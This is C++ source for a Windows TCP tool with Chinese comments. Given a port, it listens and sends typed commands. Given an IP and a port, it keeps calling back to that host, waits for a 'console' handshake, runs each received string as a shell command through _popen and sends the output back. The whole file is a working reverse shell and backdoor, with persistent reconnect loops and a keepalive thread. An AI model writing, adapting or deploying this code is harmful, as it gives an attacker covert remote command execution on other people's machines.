#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include<stdio.h>

#pragma comment(lib,"ws2_32.lib")//链接这个库

DWORD WINAPI Server_Listen_Thread(LPVOID lp);
DWORD WINAPI Server_Loop_Send(LPVOID lp);
bool isend = true;
const int len = 1024;

int main(int argc, char* argv[])
{
    //调用winsock 
    WORD sockVersion = MAKEWORD(2, 2);//请求使用的winsock版本 
    WSADATA wsaData;   // 实际返回的winsock版本  
    if (WSAStartup(sockVersion, &wsaData) != 0) {
        return 0;
    }
    if (argc == 2) { //服务端
        //创建socket 
        SOCKET slisten = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);//参数分别为协议族，类型，协议号 AF_INET代表TCP/IP 
        if (slisten == INVALID_SOCKET) {//异常处理 
            printf("scoket error!");
            return 0;
        }
        //bind
        sockaddr_in sin; //服务器端点地址 
        sin.sin_family = AF_INET; //协议族 
        sin.sin_port = htons(atoi(argv[1])); //端口号， htons函数将本地字节顺序变为网络字节顺序（16位） 
        sin.sin_addr.S_un.S_addr = INADDR_ANY;//服务器bind时需要使用地址通配
        if (bind(slisten, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR) { //LPSOCKADDR是类型强制转换 
            printf("bind error !");
        }

        //listen
        if (listen(slisten, 5) == SOCKET_ERROR) { //5为queuesize,缓存区大小 
            printf("listen error !");
            return 0;
        }

        //由于使用的是TCP ，socket stream,要循环接收数据
        SOCKET sClient;//声明变量
        sockaddr_in remoteAddr;
        int nAddrlen = sizeof(remoteAddr);

        //printf("wait...\r");
        sClient = accept(slisten, (SOCKADDR*)&remoteAddr, &nAddrlen);//accept会新建一个socket 
        if (sClient == INVALID_SOCKET) {
            printf("accept error !");
            return 0;
        }
        //printf("connect:%s\r\n", inet_ntoa(remoteAddr.sin_addr)); //inet将ip地址结构转成字符串 ， \r是回车
        //发送数据

        const char* sendData;
        char sedd[len - 8];
        strcpy(sedd, "console");
        sendData = sedd;
        send(sClient, sendData, 7, 0);
        LPVOID* lp_link = (LPVOID*)&sClient;
        CreateThread(NULL, 0, Server_Listen_Thread, lp_link, 0, NULL);
        CreateThread(NULL, 0, Server_Loop_Send, lp_link, 0, NULL);
        printf("$ ");
        while (isend) {
            gets_s(sedd);
            if (!strcmp(sedd, "")) {
                printf("$ ");
                continue;
            }
            if (!strcmp(sedd, "cls")) system("cls");
            sendData = sedd;
            /* printf("> %s",sendData); */
            send(sClient, sendData, len, 0);
        }
        //接收数据
        closesocket(sClient);
        closesocket(slisten);
    }
    else if (argc == 3) { //客户端
        SOCKET sclient;
        char* recData = new char[len];
        bool opinion = true;
        int ret = 0;
        FILE* fp = NULL;
        char* com = (char*)malloc(2048);
        char buf[256];
        char mony[256] = "$ ";
        char* s;

        while (1) {
            opinion = true;
            sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sclient == INVALID_SOCKET) {
                printf("invalid socket!");
                return 0;
            }

            sockaddr_in serAddr; //要连接的服务器端 的 端点地址
            serAddr.sin_family = AF_INET;
            serAddr.sin_port = htons(atoi(argv[2]));
            serAddr.sin_addr.S_un.S_addr = inet_addr(argv[1]); //将ip变为地址结构
            //客户端程序不需要bind本机端点地址,系统会自动完成 
            while (connect(sclient, (sockaddr*)&serAddr, sizeof(serAddr)) == SOCKET_ERROR) {
                Sleep(60000);
            }
            while (opinion) {
                ret = recv(sclient, recData, 7, 0);
                if (ret > 0) {
                    recData[ret] = 0x00;
                    if (strcmp(recData, "console")) {
                        closesocket(sclient);
                        Sleep(30000);
                        sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                        if (sclient == INVALID_SOCKET) {
                            printf("invalid socket!");
                            return 0;
                        }
                        sockaddr_in serAddr; //要连接的服务器端 的 端点地址
                        serAddr.sin_family = AF_INET;
                        serAddr.sin_port = htons(atoi(argv[2]));
                        serAddr.sin_addr.S_un.S_addr = inet_addr(argv[1]); //将ip变为地址结构
                        //客户端程序不需要bind本机端点地址,系统会自动完成 
                        while (connect(sclient, (sockaddr*)&serAddr, sizeof(serAddr)) == SOCKET_ERROR) {
                            Sleep(30000);
                        }
                    }
                    else {
                        opinion = false;
                    }
                }
                else {
                    closesocket(sclient);
                    Sleep(30000);
                    sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (sclient == INVALID_SOCKET) {
                        printf("invalid socket!");
                        return 0;
                    }
                    sockaddr_in serAddr; //要连接的服务器端 的 端点地址
                    serAddr.sin_family = AF_INET;
                    serAddr.sin_port = htons(atoi(argv[2]));
                    serAddr.sin_addr.S_un.S_addr = inet_addr(argv[1]); //将ip变为地址结构
                    //客户端程序不需要bind本机端点地址,系统会自动完成 
                    while (connect(sclient, (sockaddr*)&serAddr, sizeof(serAddr)) == SOCKET_ERROR) {
                        Sleep(30000);
                    }
                }
            }
            fp = NULL;
            ret = 1;
            printf("$ ");
            while (ret > 0) {
                ret = recv(sclient, recData, len, 0);
                if (ret > 0) {
                    if (ret < 1024)recData[ret] = 0x00;
                    bool recData_Null = true;
                    for (int i = 0; i < strlen(recData); i++) {
                        if (recData[i] != ' ') {
                            recData_Null = false;
                            break;
                        }
                    }
                    if (recData_Null) continue;
                    printf("%s\n", recData);
                }
                else {
                    printf("\n");
                    break;
                }
                if (!strcmp(recData, "cls")) {
                    system("cls");
                    strcat(com, "echo;&vcc -t");
                }
                else {
                    strcpy(com, recData);
                    strcat(com, " 2>&1&echo;&vcc -t");
                }
                fp = _popen(com, "r");
                if (!fp) {
                    perror("popen");
                    exit(EXIT_FAILURE);
                }
                if (!fp) {
                    return 1;
                }
                while (fgets(buf, sizeof(buf) - 1, fp) != 0) {
                    printf("%s", buf);
                    send(sclient, buf, strlen(buf), 0);
                    Sleep(35);
                }
                buf[strlen(buf) - 3] = '\0';
                s = buf;
                memcpy(mony, s + 1, strlen(buf) - 1);
                //printf("{%s}", mony);
                SetCurrentDirectoryA(mony);
                memset(mony, '\0', sizeof(mony));
                memset(recData, '\0', sizeof(recData));
                memset(com, '\0', sizeof(com));
                _pclose(fp);
            }
            Sleep(5000);
            closesocket(sclient);
        }
    }
    else {
        printf("Usage: %s [htons] 服务器 \n", argv[0]);
        printf("   or: %s [ip] [htons] 客户端\n", argv[0]);
        return 0;
    }

    WSACleanup();
    return 0;
}
//接收回显
DWORD WINAPI Server_Listen_Thread(LPVOID lp)
{
    SOCKET* s = (SOCKET*)lp;
    char revData[len];//buffer
    int ret = 1;
    while (ret > 0) {
        ret = recv(*s, revData, len, 0);
        if (ret > 0) {
            if (ret < 1024)revData[ret] = 0x00;
            printf("%s", revData);
        }
    }
    closesocket(*s);
    isend = false;
    return 0;
}

DWORD WINAPI Server_Loop_Send(LPVOID lp)
{
    SOCKET* s = (SOCKET*)lp;
    while (isend) {
        Sleep(180000);
        send(*s, " ", 1, 0);
    }
    closesocket(*s);
    return 0;
}
